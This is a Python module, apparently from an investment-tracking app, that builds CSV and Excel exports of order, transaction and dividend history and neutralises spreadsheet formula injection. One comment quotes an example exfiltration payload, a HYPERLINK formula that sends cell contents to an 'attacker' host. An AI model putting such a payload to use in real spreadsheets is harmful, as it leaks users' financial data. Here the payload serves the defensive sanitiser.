"""CSV / Excel exports of the history views.

Rendered server-side so an export is the *whole* dataset for the requested
window rather than whatever page the table happened to have loaded, and so the
numbers land in the sheet as numbers and dates as dates — a spreadsheet the
user can sort and total without cleaning it up first.

The window matches the column each table is sorted by, so what you see is what
you get: orders by when they were placed, transactions by when they executed,
dividends by ex-date.
"""

import csv
import io
from datetime import date, datetime, timedelta, timezone
from decimal import Decimal

from sqlalchemy import select
from sqlalchemy.orm import Session

from app.models import Account, Dividend, Order, Transaction, User, utcnow

# Same windows as the performance panel (app/services/metrics.py).
RANGE_DAYS = {"1m": 31, "3m": 92, "6m": 183, "1y": 366, "3y": 1096, "5y": 1827,
              "10y": 3653, "all": None}

DATASETS = ("orders", "transactions", "dividends")
FORMATS = ("csv", "xlsx")


def window_start(range_key: str, today: date | None = None) -> date | None:
    """First day included, or None for 'all'."""
    days = RANGE_DAYS.get(range_key, RANGE_DAYS["1y"])
    if days is None:
        return None
    return (today or utcnow().date()) - timedelta(days=days)


def _as_date(value) -> date | None:
    if isinstance(value, datetime):
        return value.astimezone(timezone.utc).date()
    return value


def _dec(value) -> Decimal | None:
    return None if value is None else Decimal(value)


def build(db: Session, user: User, dataset: str, range_key: str,
          account_id: str | None = None,
          scenario_id: str | None = None) -> tuple[list[str], list[list], str]:
    """(headers, rows, filename stem) for one dataset over one window."""
    start = window_start(range_key)
    names = {
        a.id: a.name for a in db.execute(
            select(Account).where(
                Account.user_id == user.id,
                *( [Account.scenario_id == scenario_id] if scenario_id else [] ),
            )
        ).scalars()
    }
    if account_id and account_id not in names:
        return [], [], dataset
    ids = [account_id] if account_id else list(names)
    if not ids:
        return [], [], dataset

    if dataset == "orders":
        q = (
            select(Order).where(Order.account_id.in_(ids))
            .order_by(Order.created_at.desc())
        )
        if start:
            q = q.where(Order.created_at >= datetime.combine(start, datetime.min.time(), timezone.utc))
        headers = [
            "Placed", "Account", "Side", "Ticker", "Order type", "Quantity type",
            "Quantity", "Limit price", "Time in force", "Status", "Scheduled for",
            "Effective date", "NAV date", "Expires", "Source", "Reject reason", "Order ID",
        ]
        rows = [
            [
                _as_date(o.created_at), names.get(o.account_id, ""), o.side.value, o.ticker,
                o.order_type.value, o.quantity_type.value, _dec(o.quantity),
                _dec(o.limit_price), o.time_in_force.value if o.time_in_force else None,
                o.status.value, _as_date(o.scheduled_for), o.as_of, o.nav_date,
                _as_date(o.expires_at), o.source.value, o.reject_reason, o.id,
            ]
            for o in db.execute(q).scalars()
        ]
        return headers, rows, "orders"

    if dataset == "transactions":
        q = (
            select(Transaction).where(Transaction.account_id.in_(ids))
            .order_by(Transaction.executed_at.desc())
        )
        if start:
            q = q.where(
                Transaction.executed_at >= datetime.combine(start, datetime.min.time(), timezone.utc)
            )
        headers = [
            "Executed", "Effective date", "Account", "Side", "Ticker", "Shares",
            "Price", "Amount", "Fees", "Realized gains", "Short-term gains",
            "Long-term gains", "Transaction ID", "Order ID",
        ]
        rows = [
            [
                _as_date(t.executed_at), t.as_of, names.get(t.account_id, ""), t.side.value,
                t.ticker, _dec(t.shares_filled), _dec(t.executed_price), _dec(t.gross_amount),
                _dec(t.fees), _dec(t.realized_gains), _dec(t.realized_st), _dec(t.realized_lt),
                t.id, t.order_id,
            ]
            for t in db.execute(q).scalars()
        ]
        return headers, rows, "transactions"

    q = (
        select(Dividend).where(Dividend.account_id.in_(ids))
        .order_by(Dividend.event_date.desc())
    )
    if start:
        q = q.where(Dividend.event_date >= start)
    headers = ["Ex-date", "Account", "Ticker", "Per share", "Shares held", "Amount"]
    rows = [
        [
            d.event_date, names.get(d.account_id, ""), d.ticker,
            _dec(d.per_share), _dec(d.shares), _dec(d.amount),
        ]
        for d in db.execute(q).scalars()
    ]
    return headers, rows, "dividends"


# Excel and LibreOffice treat a cell whose text starts with one of these as a
# formula, so an account named `=HYPERLINK("http://attacker/?"&A1,"x")` would
# execute when the accountant opens the export. A leading apostrophe forces the
# cell to be read as text in both.
FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")


def sanitize_cell(value):
    """Neutralise spreadsheet formula injection in a text cell.

    Only strings are at risk: numbers and dates are written as typed values and
    are never re-parsed as formulas.
    """
    if isinstance(value, str) and value.startswith(FORMULA_LEAD):
        return "'" + value
    return value


def to_csv(headers: list[str], rows: list[list]) -> bytes:
    buf = io.StringIO()
    writer = csv.writer(buf, lineterminator="\r\n")
    writer.writerow(headers)
    for row in rows:
        writer.writerow(["" if v is None
                         else (v.isoformat() if isinstance(v, date) else sanitize_cell(v))
                         for v in row])
    # BOM so Excel opens UTF-8 CSV without mangling non-ASCII
    return b"\xef\xbb\xbf" + buf.getvalue().encode("utf-8")


MONEY_COLUMNS = {
    "Price", "Amount", "Fees", "Realized gains", "Short-term gains", "Long-term gains",
    "Limit price", "Per share",
}
SHARE_COLUMNS = {"Shares", "Shares held", "Quantity"}


def to_xlsx(headers: list[str], rows: list[list], sheet_title: str,
            subtitle: str) -> bytes:
    from openpyxl import Workbook
    from openpyxl.styles import Alignment, Font, PatternFill
    from openpyxl.utils import get_column_letter

    wb = Workbook()
    ws = wb.active
    ws.title = sheet_title[:31].title()

    ws.append([subtitle])
    ws["A1"].font = Font(bold=True, size=12, color="0F172A")
    ws.append([])
    ws.append(headers)

    header_row = 3
    fill = PatternFill("solid", fgColor="0F172A")
    for col, name in enumerate(headers, start=1):
        cell = ws.cell(row=header_row, column=col)
        cell.font = Font(bold=True, color="F8FAFC")
        cell.fill = fill
        cell.alignment = Alignment(horizontal="center")

    for row in rows:
        ws.append([sanitize_cell(v) for v in row])
    # openpyxl types a string starting with "=" as a real formula, so the xlsx
    # path needs the same treatment as the csv one — and gets no "enable
    # content" prompt to slow it down.
    for row_cells in ws.iter_rows(min_row=header_row + 1):
        for cell in row_cells:
            if isinstance(cell.value, str):
                cell.data_type = "s"

    money = '#,##0.00;[Red]-#,##0.00'
    for col, name in enumerate(headers, start=1):
        letter = get_column_letter(col)
        width = max(len(name) + 2, 12)
        for cell in ws[letter][header_row:]:
            if isinstance(cell.value, Decimal):
                cell.number_format = money if name in MONEY_COLUMNS else (
                    "#,##0.000000" if name in SHARE_COLUMNS else "#,##0.00"
                )
            elif isinstance(cell.value, date):
                cell.number_format = "yyyy-mm-dd"
            if cell.value is not None:
                width = max(width, min(48, len(str(cell.value)) + 2))
        ws.column_dimensions[letter].width = width

    ws.freeze_panes = ws.cell(row=header_row + 1, column=1)
    ws.auto_filter.ref = (
        f"A{header_row}:{get_column_letter(len(headers))}{header_row + len(rows)}"
    )
    out = io.BytesIO()
    wb.save(out)
    return out.getvalue()
